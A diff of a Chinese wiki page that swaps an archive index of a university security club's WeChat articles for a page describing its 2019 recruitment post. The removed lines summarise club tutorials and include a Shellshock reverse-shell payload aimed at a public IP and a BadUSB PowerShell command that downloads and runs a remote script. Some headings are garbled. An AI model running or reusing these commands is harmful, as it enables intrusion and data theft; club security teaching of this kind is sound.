@@ -1,281 +1,139 @@
 ---
-title: 0w1Club 微信公众号文章归档索引（2019年8月–2022年7月）
-description: 0w1Club 网络安全俱乐部微信公众号 2019年8月至2022年7月期间发布文章的汇总索引，涵盖招新宣传、CTF比赛结果、萌新培养系列教程、安全峰会参会记录等核心内容。新增
-  BadUSB 实战攻击演示文章，详细记录利用 Arduino Leonardo 实现 HID 攻击窃取期末试题的完整复现过程，结合硬件安全设备清单与渗透测试工具链提供防御视角。
-category: program-analysis
+title: 0w1Club 微信归档招新宣传文章（2019年秋季）
+description: 记录 0w1 网络安全俱乐部 2019 年秋季招新宣传文章，涵盖社团简介、研究方向（无线、Web、内网渗透、流量分析、逆向工程、PWN、密码学）、主要活动及加入方式，为归档索引提供结构化条目。
+category: ai-security
 tags:
 - 0w1Club
 - 微信归档
-- 文章索引
-- CTF竞赛
 - 招新宣传
-- 萌新培养
 - 网络安全社团
 - 西安交通大学
 - 2019年
-- 2020年
-- 2021年
-- 2022年
-- 社团运营
-- 人事架构
-- 渗透测试
-- Shellshock
-- CVE-2014-6271
-- CGI漏洞
-- 实验室导航
-- BadUSB
-- HID攻击
-- Arduino Leonardo
-- 硬件安全
-- 物理接触攻击
-date: '2019-08-25'
+- 社团简介
+- 研究方向
+- CTF竞赛
+- 萌新培养
+date: '2019-09-01'
 updated: '2026-11-14'
 ---
 
-# 0w1Club 微信公众号文章归档索引（2019年8月–2022年7月）
+# 0w1Club 微信归档招新宣传文章（2019年秋季）
 
 ## 概述
 
-本页面汇总 **0w1 网络安全俱乐部**（西安交通大学网络安全学院）微信公众号在 **2019年8月–2022年7月** 期间发布的全部历史文章。索引按发布时间倒序排列，每条记录包含文章标题、发布日期、核心主题标签及关键内容摘要，旨在为安全研究者、CTF 爱好者及社团运营者提供结构化检索入口。
+本页面收录 **0w1 网络安全俱乐部**（西安交通大学网络安全学院直属）微信公众号于 **2019 年秋季** 发布的招新宣传文章。文章系统介绍了社团定位、名称寓意、过往战绩、组织架构、研究方向、主要活动及加入流程，是社团对外展示品牌形象、吸纳新成员的核心宣传物料。该文章在归档索引 [[0w1club-wechat-archive-201707-201903]] 中作为 2019 年秋季招新节点被引用，标志着 2019-2020 学年社团运营周期的正式启动。
 
-> **公众号信息**：`__biz=MzUzMzEwMDk3Mg==`  
-> **归档跨度**：2019-08-25 ~ 2022-07-xx  
-> **文章总数**：持续更新中  
-> **维护说明**：本索引基于微信原文链接整理，部分链接可能因公众号迁移或内容合规失效，建议配合站内全文归档页面阅读。
-
----
-
-## 文章列表
-
-### 年
-
-#### 报名 | 第三届 0w1 CTF 信息安全竞赛报名宣传
-- **发布日期**：2020-01-early（mid=2247484006）
-- **核心标签**：`CTF竞赛` `报名宣传` `比赛公告` `奖品设置` `西安交通大学` `线上个人赛`
-- **关键内容**：
-  - **比赛时间**：2020年1月19日 8:00 至 1月20日 20:00（共36小时）
-  - **参赛对象**：西安交大本科生
-  - **比赛形式**：线上个人赛，比赛地址 `ctf.0w1.club`，比赛用机自备
-  - **比赛内容**：逆向工程、Web安全、密码学等方向
-  - **奖项设置**：
-    - **一等奖 1名**：树莓派3开发套件（Raspberry Pi 3，基于Linux的信用卡大小微型电脑）
-    - **二等奖 2名**：TP-LINK 无线双频网卡
-    - **三等奖 3名**：BadUSB（酷似U盘的入侵测试神器，可悄悄执行代码）
-  - **要求**：参赛选手需在过关同时书写每道题题解，比赛结束后发送至命题组邮箱 `root@0w1.club`
-  - **报名方式**：点击"阅读原文"填写报名表，扫描二维码进入比赛QQ群（737271606）
-  - **主办/承办**：智能网络与网络安全实验室主办，0w1网络安全俱乐部承办
-- **原文链接**：[报名 | 第三届 0w1 CTF 信息安全竞赛报名啦！](http://mp.weixin.qq.com/s?__biz=MzUzMzEwMDk3Mg==&mid=2247484006&idx=1&sn=c23fb904d289fe327b7ddd5c4a55f82f&chksm=faa862a5cddfebb331069b720b66a2d920f39ec73440706e9fdf31e099daa23f31d90326c2b9&scene=27#wechat_redirect)
-- **关联页面**：[[0w1club-ctf-crypto-writeup-easyrsa-t9]]、[[0w1club-ctf-misc-writeup-steganography-traffic-analysis]]、[[0w1club-ctf-web-writeup-hash-extension-rsa]]（同俱乐部CTF Writeup系列）
-
-#### 第三届 0w1 CTF 比赛结果公示
-- **发布日期**：2020-01-late（mid=2247484036）
-- **核心标签**：`CTF比赛` `比赛结果` `奖项设置` `获奖名单` `奖品发放`
-- **关键内容**：
-  - **一等奖**：LittleFall-齐智 → 奖品：树莓派3开发套件
-  - **二等奖**：excited+1s-沈俞霖、iChaos-祁敬超 → 奖品：TP-LINK无线网卡
-  - **三等奖**：Dan_Liu-刘承佳、Luke_J-姜彦凯、yyy-杨开发 → 奖品：Bad USB
-  - 奖品承诺开学后联系发放
-- **原文链接**：[比赛结果|第三届0w1 CTF](http://mp.weixin.qq.com/s?__biz=MzUzMzEwMDk3Mg==&mid=2247484036&idx=1&sn=d233f07eb9b1d8daf83620f47f56a55b&chksm=faa86247cddfeb512913b229f70d76c6d9b62c0fef4ece99db54c86ed6dca31faff7ebc5f072&scene=27#wechat_redirect)
-- **关联页面**：[[0w1club-week2-wifi-hijacking-arp-spoofing]]（同期萌新培训系列）
-
-### 年
-
-#### 社团人事架构重组与部门成员招募
-- **发布日期**：2019-11 预估（mid=2247483961，idx=2，与第八期萌新培养预告同期推送）
-- **核心标签**：`社团运营` `人事架构` `部门招募` `组织建设` `技术部` `宣传部` `财务部` `西安交通大学`
-- **关键内容**：
-  - **背景**：社团事务繁忙，现有核心力量难以支撑日常运维，需重组人事架构、招募新成员
-  - **新架构设计**：
-    - **会长&副会长**：各1名（副会长兼任团支部书记），目前暂缺副会长
-    - **财务部**：负责财务管理，工作集中在每学期比赛期间，部长：李思奇
-    - **技术部**：3位部长分管运维、比赛、培训三大方向
-    - **宣传部**：负责公众号运营、校内招新与比赛宣传、社团形象推广维护
-  - **招募声明**：
-    - 遵循沙龙性质与自愿原则，不强制成员加入部门
-    - 换届时间为每学年第一学期期末
-    - **技术部招募**：求责任心&好奇心，共同处理技术事务、提升技能（扫码报名）
-    - **宣传部招募**：维护0w1形象、推广理想（扫码报名）
-    - **财务部**：事务较少，可单独联系部长@李思奇
-    - 愿为社团做更多贡献者，欢迎私戳会长商议
-- **原文链接**：[We Need You](http://mp.weixin.qq.com/s?__biz=MzUzMzEwMDk3Mg==&mid=2247483961&idx=2&sn=cd619d88be05592079e85aae0c59f7e3&chksm=faa862facddfebec140125438b1621666e12d2b92d63b43b6f1d389f3f4f50af70bb85c389d6&scene=27#wechat_redirect)
-- **关联页面**：[[0w1club-week8-raspberry-pi-training]]（同期推送idx=1）、[[0w1club-week2-wifi-hijacking-arp-spoofing]]、[[phishing-website-creation-tutorial]]、[[crypto-basics-xor-stream-cipher-tutorial]]、[[rop-linux-x86-beginner-tutorial]]（技术部分管培训方向对应萌新培养系列）
-
-#### 第八期萌新培养预告：树莓派（PI）有趣玩法分享会
-- **发布日期**：2019-11 预估（mid=2247483961，idx=1，与人事架构重组文同期推送）
-- **核心标签**：`萌新培养` `树莓派` `Raspberry Pi` `极客文化` `硬件安全` `分享会预告` `投票定时间`
-- **关键内容**：
-  - **主题**：极客之旅（PI的有趣玩法）
-  - **主讲人**：游江楠（电气工程学院 2016 级，爱好黑客极客文化）
-  - **时长**：30 分钟
-  - **地点**：实验室（详见关联文章《请带我去实验室》mid=2247483906）
-  - **时间**：通过微信公众号投票决定（原文含投票卡片）
-  - **系列定位**：萌新培养第八期（W8），延续 Web、逆向、Pwn、密码学、杂项之外的硬件/极客方向拓展
-- **原文链接**：[分享会预告|W8](http://mp.weixin.qq.com/s?__biz=MzUzMzEwMDk3Mg==&mid=2247483961&idx=1&sn=52f8518a537f14eae793ce32334d6c2a&chksm=faa862facddfebecc7f8478a8d5eedda746443219a420a95ebef25773a70273af1c5fa3958ac&scene=27#wechat_redirect)
-- **关联页面**：[[0w1club-week2-wifi-hijacking-arp-spoofing]]、[[phishing-website-creation-tutorial]]、[[crypto-basics-xor-stream-cipher-tutorial]]、[[rop-linux-x86-beginner-tutorial]]（同系列前几期培训）、[[0w1club-week8-raspberry-pi-training]]（详情页）
-
-#### **分享会|一次渗透测试：Bash Shellshock 漏洞（CVE-2014-6271）结合 CGI 环境变量注入实战**
-- **发布日期**：2019-10 预估（mid=2247483921，位于实验室引导文后、W8预告前）
-- **核心标签**：`渗透测试` `Shellshock` `CVE-2014-6271` `CGI漏洞` `环境变量注入` `反弹Shell` `Bash` `萌新培养` `实战教程`
-- **关键内容**：
-  - **漏洞原理**：Bash 在处理含有函数定义（`() { :; }`）的环境变量赋值时存在设计缺陷，错误地将函数定义后的字符串作为命令执行
-  - **攻击向量**：CGI 脚本通过环境变量传递数据，攻击者通过修改 HTTP 头的 `User-Agent` 字段注入恶意 Payload
-  - **实战靶场**：`example.xjtu.edu.cn:801/cgi-bin/test.cgi`（校内靶机）+ `107.151.218.48:1234`（公网监听服务器）
-  - **利用链路**：
-    1. 识别注入点：CGI 环境变量（`HTTP_USER_AGENT` 等）
-    2. 构造 Payload：`() { :; }; /bin/bash -c "bash -i >& /dev/tcp/107.151.218.48/1234 0>&1"`
-    3. 公网服务器 `nc -lvp 1234` 监听
-    4. 发送恶意请求触发漏洞，反弹 Shell 成功
-  - **工具演示**：`curl` 一键利用、`ncat` 监听与反弹、`env` 命令测试环境变量解析
-  - **痕迹清理**：清理 `.bash_history`、Web 访问日志、进程残留等入侵痕迹
-  - **练习环境**：`http://39.106.48.250:8080/cgi-bin/stats`（需公网服务器配合）
-  - **参考资料**：Qualys QID 13038、Shellshock 系列漏洞分析、Linux 入侵控制与痕迹清理
-- **原文链接**：[分享会|一次渗透测试](http://mp.weixin.qq.com/s?__biz=MzUzMzEwMDk3Mg==&mid=2247483921&idx=1&sn=c74a8164494573cc3760b9bf50cdf959&chksm=faa862d2cddfebc41836d05cc2a8fe8ad91ed7f07de9fb61a7e15ce35640996a99d5def078da&scene=27#wechat_redirect)
-- **关联页面**：[[0w1club-training-shellshock-cgi-exploitation]]（详细实战记录页面）、[[0w1club-week2-wifi-hijacking-arp-spoofing]]、[[ar-drone-2.0-penetration-testing]]、[[metasploit-framework-basics-tutorial]]、[[burpsuite-basics-tutorial]]、[[frp内网渗透应用]]
-
-#### **分享会预告|W2：一次渗透测试经历**
-- **发布日期**：2019-10 预估（mid=2247483909，位于实验室引导文后、渗透测试实战分享会前）
-- **核心标签**：`萌新培养` `渗透测试` `分享会预告` `投票定时间` `Shellshock` `CVE-2014-6271` `CGI漏洞` `严宋扬`
-- **关键内容**：
-  - **主题**：一次渗透测试经历
-  - **主讲人**：严宋扬（软件学院大三学生，发际线堪忧，安全路上永远是小白）
-  - **时长**：40 分钟
-  - **地点**：实验室（详见关联文章《请带我去实验室》mid=2247483906）
-  - **时间**：通过微信公众号投票决定（原文含投票卡片，supervoteid=480867752）
-  - **系列定位**：萌新培养第二期分享会预告（W2），预告后续实战分享会内容为 Bash Shellshock 漏洞（CVE-2014-6271）结合 CGI 环境变量注入反弹 Shell
-- **原文链接**：[分享会预告|W2](http://mp.weixin.qq.com/s?__biz=MzUzMzEwMDk3Mg==&mid=2247483909&idx=1&sn=faac08beb7b26c7ed29b48ac2881e242&chksm=faa862c6cddfebd054eec3d5fb2ca4b1dc7e387088faa33f15b5d86d3eafc14b9bfca348c76f&scene=27#wechat_redirect)
-- **关联页面**：[[0w1club-training-shellshock-cgi-exploitation]]（对应的实战分享会详细记录）、[[0w1club-week2-wifi-hijacking-arp-spoofing]]（同期萌新培养周度教程）、[[ar-drone-2.0-penetration-testing]]、[[metasploit-framework-basics-tutorial]]、[[burpsuite-basics-tutorial]]、[[frp内网渗透应用]]（渗透测试工具链延伸）
-
-#### 请带我去实验室（实验室位置引导）
-- **发布日期**：2019-10 预估（mid=2247483906）
-- **核心标签**：`社团运营` `实验室` `线下活动` `西安交通大学` `智能网络与网络安全教育部重点实验室` `导航指引`
-- **关键内容**：
-  - **文章目的**：图文引导新成员找到社团实验室位置，为后续线下分享会（如 W2 渗透测试、W8 树莓派分享会）做准备
-  - **路线指引**：
-    1. 以**图书馆**为地标起点
-    2. 靠右行驶进入匝道（网信中心方向）
-    3. 在**网信中心门口**停下
-    4. 进入**实验室小楼**（大隐隐于市）
-    5. **上三楼**，入口在楼梯口左侧
-  - **注意事项**：
-    - 叫社团工作人员开门
-    - 请勿大声喧哗
-    - 大门无阻尼设置，请温柔关门
-  - **供图致谢**：祖传路线图供图：于丁
-- **原文链接**：[请带我去实验室](http://mp.weixin.qq.com/s?__biz=MzUzMzEwMDk3Mg==&mid=2247483906&idx=1&sn=7853e7efb9372ca8a74c500714b6817b&chksm=faa862c1cddfebd7f2fa07238a539bc8bedb7ad04c055f1e327f21f0e9b807509634940bc591&scene=21#wechat_redirect)
-- **关联页面**：[[0w1club-training-shellshock-cgi-exploitation]]（W2渗透测试分享会实战）、[[0w1club-week8-raspberry-pi-training]]（W8树莓派分享会预告）、[[0w1club-week2-wifi-hijacking-arp-spoofing]]（萌新培养周度系列）
-
-#### **BadUSB 实战攻击演示：利用 Arduino Leonardo 窃取期末试题**
-- **发布日期**：2019-09 初预估（mid=2247483721，位于秋季招新宣传后、CTFd靶场上线前）
-- **核心标签**：`BadUSB` `HID攻击` `Arduino Leonardo` `硬件安全` `物理接触攻击` `PowerShell` `社会工程学` `0w1Club` `安全研究` `期末试题`
-- **关键内容**：
-  - **攻击背景**：作者以「不想复习、想提前获取期末试题」为切入点，演示如何利用 BadUSB 在物理接触老师电脑的短暂窗口期实施攻击
-  - **BadUSB 原理**：利用伪装成键盘的 USB 设备（Arduino Leonardo），在插入电脑时模拟键盘输入预设命令序列。Windows 系统理论上可仅用键盘完成全操作（如 `Win+X` 关机、`Win+R` 打开运行）
-  - **硬件选型**：淘宝购买最便宜的 Arduino Leonardo（文中称为「邪恶的黑色小棒棒」），具备原生 USB HID 支持
-  - **攻击载荷设计**：
-    1. 触发 `Win+R` 打开「运行」对话框
-    2. 输入 `powershell -windowstyle hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"` 并回车
-    3. 1 秒内完成下载并静默执行远程脚本
-  - **远程脚本功能**：搜索受害机器所有 Word 文档（`*.docx`），打包为 ZIP，通过 SMTP 发送至攻击者邮箱（文中出于安全考虑未公开完整代码）
-  - **实战实施**：
-    - 场景：老师答疑时关闭显示器讲题，趁老师倒水背身的约 3 秒窗口
-    - 动作：插入 BadUSB → 默数 3 秒 → 拔出
-    - 兼容性：Win7/Win8/Win10 测试通过
-  - **攻击结果**：成功收到含 `****期末.docx` 的邮件附件，但文中透露该试卷疑为 10 年前旧卷，作者最终仍挂科
-  - **防御启示**：
-    - 物理接触攻击难以通过纯软件防御完全规避
-    - 关键设备需启用 BIOS/UEFI 密码、禁用 USB 端口或使用端口锁
-    - 关注 `Win+R` / `Win+X` 等高危快捷键的组策略限制
-    - 结合 [[badusb-hid-attack-arduino-leonardo]] 页面的防御视角：USB 设备白名单、HID 行为基线审计、物理安全培训
-- **原文链接**：[如何得到期末考试的试题？](http://mp.weixin.qq.com/s?__biz=MzUzMzEwMDk3Mg==&mid=2247483721&idx=1&sn=637b2fe48cd31fc676b2913bde2fc428&chksm=faa8618acddfe89cf9ac9bc0a6cb50c3e6e9cddcd7e89b59eecd5be3dbd35e08b729cc04595f&scene=27#wechat_redirect)
-- **关联页面**：[[badusb-hid-attack-arduino-leonardo]]（BadUSB HID 攻击原理、脚本编写、实战复现全过程详解）、[[0w1club-hardware-atlas]]（社团硬件租借计划中的 BadUSB 设备清单）、[[phishing-website-creation-tutorial]]（社会工程学攻击链延伸）、[[0w1club-week2-wifi-hijacking-arp-spoofing]]（同期萌新培养系列）
-
-#### 第五周萌新培养：ROP 入门（Linux x86）
-- **发布日期**：2019-10 预估
-- **核心标签**：`萌新培养` `ROP` `二进制利用` `GDB` `GEF` `Pwntools` `Linux x86`
-- **关键内容**：返回导向编程基础，栈溢出利用、Gadget 搜寻、ROP 链构造全流程实战
-- **关联页面**：[[rop-linux-x86-beginner-tutorial]]
-
-#### 第四周萌新培养：密码学入门（异或/流密码）
-- **发布日期**：2019-09-28
-- **核心标签**：`萌新培养` `密码学` `异或` `流密码` `CTF Crypto` `实战题目`
-- **关键内容**：异或加密原理、流密码攻击思路、实战题目演练
-- **关联页面**：[[crypto-basics-xor-stream-cipher-tutorial]]
-
-#### 第三周萌新培养：钓鱼网站制作
-- **发布日期**：2019-09-21
-- **核心标签**：`萌新培养` `钓鱼攻击` `社会工程学` `SET工具包` `PHP手工构造` `Docker部署`
-- **关键内容**：三种钓鱼页面制作路径：Social-Engineer Toolkit 自动化、手写 PHP 表单处理、Docker 容器化部署
-- **关联页面**：[[phishing-website-creation-tutorial]]
-
-#### 第二周萌新培养：WiFi 劫持与 ARP 欺骗
-- **发布日期**：2019-09-11
-- **核心标签**：`萌新培养` `ARP欺骗` `中间人攻击` `WiFi劫持` `渗透测试` `Kali Linux` `Wireshark` `netdiscover` `arpspoof`
-- **关键内容**：ARP 协议原理、ARP 欺骗攻击流程（探测、毒化、开启 IP 转发）、常用工具实战
-- **关联页面**：[[0w1club-week2-wifi-hijacking-arp-spoofing]]
-
-#### 首次见面会
-- **发布日期**：2019-09-06
-- **核心标签**：`招新宣传` `线下活动` `社团介绍` `彭康楼122`
-- **关键内容**：2019 秋季招新后首次线下见面会，地点：彭康楼 122
-
-#### CTFd 靶场上线
-- **发布日期**：2019-08-28
-- **核心标签**：`CTF竞赛` `靶场建设` `CTFd` `训练平台`
-- **关键内容**：自营 CTFd 平台上线，支撑后续训练与选拔
-
-#### 秋季招新宣传文章
-- **发布日期**：2019-08-25（mid=2247483664，归档序列首篇）
-- **核心标签**：`招新宣传` `社团简介` `CTF竞赛` `企业实习` `科研训练` `绿盟科技` `Base64验证`
-- **关键内容**：
-  - 社团定位：西安交大网安学院直属，面向本科生构建网安学习环境
-  - 核心活动：CTF竞赛、安全峰会参会、绿盟科技假期实习、课题组科研训练
-  - 分层培养：萌新技能树（编程/代码审计、网络协议、密码学、逆向工程、二进制利用）+ 大佬交流环境
-  - 入群验证：QQ群 770991011，答案需 Base64 编码提交，考察自主学习能力
-- **全文归档**：[[0w1club-wechat-archive-201707-201903]]（含完整文章内容及运营启示录）
-- **后续节点**：
-  - 2019-08-28 自营 CTFd 靶场上线
-  - 2019-09-02 首次见面会通知（彭康楼 122）
-  - 2019-09-06 首次见面会举办
-  - 2019-09-11 第 2 周培训：WiFi 劫持/ARP 欺骗 [[0w1club-week2-wifi-hijacking-arp-spoofing]]
-  - 2019-09-21 第 3 周培训：钓鱼网站制作 [[phishing-website-creation-tutorial]]
-  - 2019-09-28 第 4 周培训：密码学入门 [[crypto-basics-xor-stream-cipher-tutorial]]
-  - 2019-10-xx 第 5 周培训：ROP 入门 [[rop-linux-x86-beginner-tutorial]]
-  - 2019-09 初 **BadUSB 实战攻击演示：利用 Arduino Leonardo 窃取期末试题** [[#badusb-实战攻击演示利用-arduino-leonardo-窃取期末试题]]
-  - 2019-10-xx **分享会预告 W2：一次渗透测试经历** [[#分享会预告w2一次渗透测试经历]]
-  - 2019-10-xx **分享会：一次渗透测试（Shellshock+CGI）** [[#分享会一次渗透测试bash-shellshock-漏洞cve-2014-6271结合-cgi-环境变量注入实战]]
-  - 2019-10-xx **请带我去实验室（实验室位置引导）** [[#请带我去实验室实验室位置引导]]
-  - 2019-11 第 8 周预告：树莓派玩法 [[0w1club-week8-raspberry-pi-training]]
+> **原文链接**：[招新啦！！！](http://mp.weixin.qq.com/s?__biz=MzUzMzEwMDk3Mg==&mid=2247483713&idx=1&sn=4b73a392c7740ffbe1112c15b967016b&chksm=faa86182cddfe8945800757e419d1420e37f1fcc56e8a63b933e7a4cd42d9b5b44ac3509f880&scene=27#wechat_redirect)  
+> **发布时间**：2019 年 9 月初（由 `mid=2247483713` 推算，紧接秋季招新宣传文章 `mid=2247483664` 之后）  
+> **公众号标识**：`__biz=MzUzMzEwMDk3Mg==`
 
 ---
 
-## 专题聚合视图
+## 社团简介
 
-### CTF 竞赛与训练体系
-| 专题 | 关联文章/页面 | 说明 |
-| :--- | :--- | :--- |
-| **第三届 0w1 CTF 报名宣传** | 本页 2020年条目 1 | 赛事公告、奖品详情、报名方式、题解要求 |
-| **第三届 0w1 CTF 结果** | 本页 2020年条目 2 | 奖项设置、获奖名单、奖品清单 |
-| **萌新培养周度系列** | 第 2–5 周培训、第 8 周预告、**渗透测试分享会预告(W2)、渗透测试实战分享会、BadUSB 实战演示** | Web、逆向、Pwn、密码学、杂项、硬件/极客、**渗透测试实战、硬件物理攻击**全覆盖 |
-| **CTFd 靶场建设** | 2019-08-28 基建节点 | 自营平台支撑训练与选拔 |
-| **外部赛事参与** | 待补充 | 如启明星辰杯、TCTF 等战报 |
+### 定位与使命
+- **性质**：互联网技术社团，专注于**网络安全技术**研究与实践。
+- **使命**：致力于为学校培养更多的网络安全人才。
+- **隶属**：西安交通大学网络安全学院直属，依托 **智能网络与网络安全教育部重点实验室** 开展活动。
 
-### 校企融合与人才输送
-| 合作方 | 模式 | 关联文章/节点 |
-| :--- | :--- | :--- |
-| **绿盟科技** | 假期定向实习、留用推荐 | 招新文企业实习版块、实景图文 |
-| **网安学院课题组** | 科研训练、论文/专利产出 | 招新文科研训练版块、双轨培养设计 |
+### 名称寓意
+- **0w1** 由英文单词 `owl`（猫头鹰）变形而来，寓意社团成员像猫头鹰一样**机警、敏锐**，是黑夜中的捕猎者。
+- **0** 与 **1** 代表数字世界，恰与字母 `o` 和 `l` 相似，形成视觉呼应。
 
-### 社团运营方法论
-| 维度 | 典型做法 | 参考价值 |
+### 过往战绩
+- 曾代表学校参加**铁人三项信息安全竞赛**（即“铁三赛”），取得**西北赛区第一**的成绩。详见 [[0w1club-tiesan-training-camp]] 中关于铁三赛及国家信息安全水平考试、CISP 认证衔接的记录。
+
+### 组织架构
+- 采取**扁平化管理**，架构分为两层：
+  - **理事会**：包含核心会员与社团管理人员。
+  - **普通会员**：广大社团成员。
+- 后续于 2019 年 11 月进行人事架构重组，设立会长/副会长、财务部、技术部（运维/比赛/培训三组）、宣传部五大职能部门，详见归档索引 [[0w1club-wechat-archive-201908-202207]] 中“社团人事架构重组与部门成员招募”条目。
+
+### 口号
+> **No tech, no life**
+
+---
+
+## 研究方向
+
+文章列举的研究方向覆盖网络安全主流技术栈，后续萌新培养系列分享会与 CTF 训练均围绕这些方向展开：
+
+| 方向 | 核心内容摘要 | 关联训练/实战页面 |
 | :--- | :--- | :--- |
-| **品牌叙事** | 热剧梗联动、自嘲队名、大佬合影 | 破圈传播+圈层真实感并重 |
-| **资源整合** | 学院课题组 + 头部企业双通道 | 校企融合、科研实战双轨稀缺资源显式承诺 |
-| **培养承诺** | 技能清单化、动词分级（掌握/了解/深入） | 降低认知负荷、设定合理预期、便于考核对标 |
-| **入群筛选** | Base64 编码验证 | 零成本筛选“会搜索、会动手、有好奇心”种子用户 |
-| **节奏把控** | 靶场就绪 → 招新 → 见面 → 培训，无真空期 | 标准化运营 SOP 雏形，三年持续复用 |
-| **组织架构演进** | 沙龙制→部门制（会长/副会长/财务/技术/宣传） | 随事务增长显式分工、公开招募、任期制换届，展示学生社团治理成熟度 |
-| **线下活动保障** | 实验室导航图文指引 | 降低新成员参与门槛，保障分享会、培训顺利开展 |
-| **攻防案例教学** | 真实渗透测试、BadUSB 物理攻击复现 | 以「反面教材+防御视角」形式落地安全意识教育 |
+| **无线安全** | 涵盖 RFID、蓝牙、WiFi、无线汽车遥控、手机通讯系统、GPS 导航等无线电相关安全问题。 | [[0w1club-week2-wifi-hijacking-arp-spoofing]]（WiFi 劫持与 ARP 欺骗实战）、[[knob-bluetooth-bredr-key-negotiation-vulnerability]]（蓝牙 KNOB 攻击原理） |
+| **Web 安全** | 网络安全常用突破口，攻击方式多样、技术复杂、难以防御；网页是组织对外媒介，常为攻击起始点。 | [[0w1club-ctf-web-writeup-hash-extension-rsa]]、[[0w1club-ctf-web-writeup-jwt-sqli-brute]]、[[phishing-website-creation-tutorial]]（钓鱼网站制作）、[[burpsuite-basics-tutorial]] |
+| **内网渗透** | 利用内部网络相互信任与连接，从边界服务器横向移动控制高价值主机。 | [[frp内网渗透应用]]、[[metasploit-framework-basics-tutorial]]、[[0w1club-training-shellshock-cgi-exploitation]]（Shellshock CGI 环境变量注入反弹 Shell） |
+| **流量分析** | 监控抓取网络通信数据流，分析协议内容溯源攻击行为，支撑追踪、防御、反制。 | [[0w1club-ctf-misc-writeup-steganography-traffic-analysis]]（流量分析/PCAP 取证）、[[0w1club-week8-wireshark-arp-mitm-training]]（Wireshark/PPPoE/PAP/ARP 中间人实战） |
+| **逆向工程** | 从底层代码（汇编、二进制）推导实现逻辑，如破解注册验证、分析恶意样本。 | [[0w1club-week7-stack-overflow-rop-training]]（栈溢出/ROP）、[[rop-linux-x86-beginner-tutorial]]、[[reverse-engineering-beginner-learning-path]] |
+| **PWN (二进制利用)** | 通过二进制/系统调用漏洞获取目标 Shell 实现控制；“万物皆可 Pwn”时代已至。 | [[0w1club-first-ctf-writeup-2018]]（Reverse/PWN 入门题）、[[mtctf-2021-web-writeup]]（PHP 反序列化条件竞争）、[[tctf-2021-1linephp-zip-include]] |
+| **密码学** | 研究编制/破译密码技术，广泛应用于安全协议、数字签名、身份认证，保障机密性、完整性、抗抵赖。 | [[0w1club-ctf-crypto-writeup-easyrsa-t9]]（RSA 大数分解/T9 解码）、[[crypto-basics-xor-stream-cipher-tutorial]]（异或/流密码入门）、[[mtctf-2021-crypto-writeup]]（RSA Padding Oracle） |
+
+---
+
+## 主要活动
+
+1. **网络安全知识培训**  
+   系统化萌新培养系列，涵盖 Web、逆向、Pwn、密码学、杂项、无线、硬件等方向。已形成周度分享会机制：
+   - 第 2 周：WiFi 劫持/ARP 欺骗 [[0w1club-week2-wifi-hijacking-arp-spoofing]]
+   - 第 3 周：钓鱼网站制作 [[phishing-website-creation-tutorial]]
+   - 第 4 周：密码学入门（异或/流密码） [[crypto-basics-xor-stream-cipher-tutorial]]
+   - 第 5 周：ROP 入门（Linux x86） [[rop-linux-x86-beginner-tutorial]]
+   - 第 7 周：栈溢出/ROP 进阶 [[0w1club-week7-stack-overflow-rop-training]]
+   - 第 8 周：树莓派极客玩法 [[0w1club-week8-raspberry-pi-training]]
+   - 专题分享会：一次渗透测试（Shellshock+CVE-2014-6271）[[0w1club-training-shellshock-cgi-exploitation]]
+
+2. **分享会**  
+   不定期邀请核心成员或校友输出实战经验，如“一次渗透测试经历”、BadUSB 物理攻击演示等。
+
+3. **线上及线下 CTF 比赛**  
+   - 校内选拔赛：第三届 0w1 CTF 信息安全竞赛（2020-01，线上个人赛 36 小时）[[0w1club-wechat-archive-201908-202207]]  
+   - 校外参赛：铁人三项赛、强网杯、TCTF、启明星辰杯等，战报分散于归档索引中。
+   - 历届赛题 Writeup：首届校内赛 13 道题全解 [[0w1club-first-ctf-writeup-2018]]、Crypto/Web/Misc 多方向 Writeup 系列 [[0w1club-ctf-crypto-writeup-easyrsa-t9]]、[[0w1club-ctf-web-writeup-hash-extension-rsa]]、[[0w1club-ctf-misc-writeup-steganography-traffic-analysis]]
+
+4. **社团内部项目开发**  
+   如自营 CTFd 靶场搭建（2019-08-28 上线）、硬件设备租借计划「0w1硬件图鉴」[[0w1club-hardware-atlas]]（含 BadUSB、Proxmark3、Ubertooth One、HackRF One 等六大类设备）。
+
+5. **对外宣传**  
+   微信公众号运营、校内招新海报、比赛宣传推送、安全峰会协助参会宣传（如 2018 年第三届 SSC 安全峰会）。
+
+---
+
+## 加入方式
+
+文章提供的加入路径包含两步验证机制，兼具筛选与引导功能：
+
+1. **填写问卷（主流程）**  
+   - 点击文章「阅读原文」跳转问卷页面提交报名信息。
+   - 稍后社团安排面试（具体形式未在文中展开）。
+
+2. **扫码入群（即时互动）**  
+   - 扫描文中二维码加入**招新 QQ 群**（群号文中未直接给出，需扫码获取）。
+   - 群内可直接提问交流，降低新生咨询门槛。
+
+> **设计亮点**：同期 2019 年春季招新曾采用 **Base64 编码验证** 入群（答案需 Base64 编码提交，考察自主学习与动手能力），秋季招新改为「问卷+面试+群内答疑」组合拳，体现运营策略的迭代。
+
+---
+
+## 归档索引中的定位
+
+本文是 **2019-2020 学年秋季运营序列** 的起点文章，后续节点按时间顺序串联：
+
+| 时间节点 | 事件/文章 | 关联页面 |
+| :--- | :--- | :--- |
+| 2019-08-25 | 秋季招新宣传（春季版，含 Base64 验证） | [[0w1club-wechat-archive-201707-201903]] |
+| 2019-09 初 | **本文：秋季招新宣传（问卷+面试+群）** | **当前页面** |
+| 2019-08-28 | 自营 CTFd 靶场上线 | 归档索引基建节点 |
+| 2019-09-06 | 首次线下见面会（彭康楼 122） | 归档索引线下活动节点 |
+| 2019-09-11 | 第 2 周培训：WiFi 劫持/ARP 欺骗 | [[0w1club-week2-wifi-hijacking-arp-spoofing]] |
+| 2019-09-21 | 第 3 周培训：钓鱼网站制作 | [[phishing-website-creation-tutorial]] |
+| 2019-09-28 | 第 4 周培训：密码学入门 | [[crypto-basics-xor-stream-cipher-tutorial]] |
+| 2019-10-xx | 第 5 周培训：ROP 入门 | [[rop-linux-x86-beginner-tutorial]] |
+| 2019-10-xx | 分享会预告 W2：一次渗透测试经历 | 归档索引条目 |
+| 2019-10-xx | **分享会实战：Shellshock+CVE-2014-6271** | [[0w1club-training-shellshock-cgi-exploitation]] |
+| 2019-10-xx | 实验室位置引导《请带我去实验室》 | 归档索引条目 |
+| 2019-11 | 第 8 周预告：树莓派玩法 | [[0w1club-week8-raspberry-pi-training]] |
+| 2019-11 | 社团人事架构重组与部门招募 | 归档索引条目 |
